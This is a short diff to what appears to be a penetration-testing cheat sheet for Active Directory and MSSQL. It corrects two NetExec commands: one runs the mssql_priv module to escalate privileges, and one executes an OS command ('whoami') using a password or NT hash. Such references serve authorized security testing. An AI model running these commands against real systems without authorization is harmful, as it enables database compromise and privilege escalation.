@@ -722,12 +722,12 @@ bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> 
   ```
 
   ```shell
-  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M mssql_priv
+  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M mssql_priv -o ACTION=privesc
   ```
 
   ### MSSQL execute commands
   ```shell
-  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -M mssql_priv -o ACTION=privesc
+  NetExec mssql <target_IP> -u <AD_user> -p <password> -H <hash_NT]> -x 'whoami'
   ```
 
   ### impacket MSSQL
